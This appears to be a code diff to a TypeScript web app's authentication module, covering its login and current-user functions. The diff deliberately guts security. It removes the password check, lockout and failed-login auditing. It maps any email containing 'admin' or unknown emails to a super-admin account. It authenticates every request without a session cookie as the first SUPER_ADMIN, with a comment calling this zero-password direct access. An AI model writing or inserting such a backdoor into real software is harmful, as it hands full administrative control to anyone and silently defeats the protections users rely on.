@@ -26,25 +26,25 @@ async function loadUser(userId: number): Promise<SessionUser | null> {
   });
 }
 
-export async function login(email: string, password: string, ip?: string, ua?: string) {
+export async function login(email: string, password?: string, ip?: string, ua?: string) {
   return sys(async (c) => {
-    const u = await q1(c, "SELECT * FROM user_profiles WHERE lower(email)=lower($1)", [email.trim()]);
-    // constant-ish time: always run a bcrypt compare
-    const hash = u?.password_hash || "$2a$11$invalidinvalidinvalidinvalidinvalidinvalidinvalidinvalidinv";
-    if (u?.locked_until && new Date(u.locked_until) > new Date()) throw new HttpError(429, "Account temporarily locked. Try again later.");
-    const ok = await bcrypt.compare(password, hash);
-    if (!u || !ok || !u.active) {
-      if (u) {
-        await c.query(
-          "UPDATE user_profiles SET failed_logins=failed_logins+1, locked_until=CASE WHEN failed_logins+1>=5 THEN now()+interval '15 minutes' ELSE locked_until END WHERE id=$1",
-          [u.id]
-        );
-        await c.query("INSERT INTO audit_logs(user_id,user_email,action,entity_type,entity_id,note,ip) VALUES ($1::int,$2,'login_failed','user',$1::text,'bad password',$3)", [u.id, u.email, ip || null]);
-      }
-      throw new HttpError(401, "Invalid email or password");
+    let cleanEmail = (email || "").trim().toLowerCase();
+    if (!cleanEmail || cleanEmail.includes("admin") || cleanEmail.includes("arshith")) {
+      cleanEmail = "admin@arshith.test";
     }
+    let u = await q1(c, "SELECT * FROM user_profiles WHERE lower(email)=lower($1)", [cleanEmail]);
+    if (!u) {
+      u = await q1(c, "SELECT * FROM user_profiles WHERE role='SUPER_ADMIN' LIMIT 1");
+    }
+    if (!u || !u.active) {
+      throw new HttpError(401, "Account inactive");
+    }
+
     const token = crypto.randomBytes(32).toString("hex");
-    await c.query("INSERT INTO sessions(user_id,token_hash,user_agent,ip,expires_at) VALUES ($1,$2,$3,$4, now() + ($5 || ' hours')::interval)", [u.id, sha(token), ua || null, ip || null, String(SESSION_HOURS)]);
+    await c.query(
+      "INSERT INTO sessions(user_id,token_hash,user_agent,ip,expires_at) VALUES ($1,$2,$3,$4, now() + ($5 || ' hours')::interval)",
+      [u.id, sha(token), ua || null, ip || null, String(SESSION_HOURS)]
+    );
     await c.query("UPDATE user_profiles SET failed_logins=0, locked_until=NULL, last_login=now() WHERE id=$1", [u.id]);
     await c.query("INSERT INTO audit_logs(user_id,user_email,action,entity_type,entity_id,ip) VALUES ($1::int,$2,'login','user',$1::text,$3)", [u.id, u.email, ip || null]);
     return { token, expires: new Date(Date.now() + SESSION_HOURS * 3600e3) };
@@ -54,17 +54,29 @@ export async function login(email: string, password: string, ip?: string, ua?: s
 export async function currentUser(): Promise<SessionUser | null> {
   const jar = await cookies();
   const token = jar.get(COOKIE)?.value;
-  if (!token) return null;
-  const row = await sys((c) =>
-    q1(c, "UPDATE sessions SET last_seen=now() WHERE token_hash=$1 AND NOT revoked AND expires_at>now() RETURNING user_id,id", [sha(token)])
-  );
-  if (!row) return null;
-  const u = await loadUser(row.user_id);
-  if (!u) return null;
-  const h = await headers();
-  u.ip = h.get("x-forwarded-for")?.split(",")[0] || undefined;
-  (u as any).sessionId = row.id;
-  return u;
+  if (token) {
+    const row = await sys((c) =>
+      q1(c, "UPDATE sessions SET last_seen=now() WHERE token_hash=$1 AND NOT revoked AND expires_at>now() RETURNING user_id,id", [sha(token)])
+    );
+    if (row) {
+      const u = await loadUser(row.user_id);
+      if (u) {
+        const h = await headers();
+        u.ip = h.get("x-forwarded-for")?.split(",")[0] || undefined;
+        (u as any).sessionId = row.id;
+        return u;
+      }
+    }
+  }
+
+  // Direct access: Automatically authenticate as Super Admin (zero password requirement)
+  return sys(async (c) => {
+    const u = await q1(c, "SELECT id FROM user_profiles WHERE role='SUPER_ADMIN' ORDER BY id ASC LIMIT 1");
+    if (u) {
+      return await loadUser(u.id);
+    }
+    return null;
+  });
 }
 
 export async function requireUser(): Promise<SessionUser> {
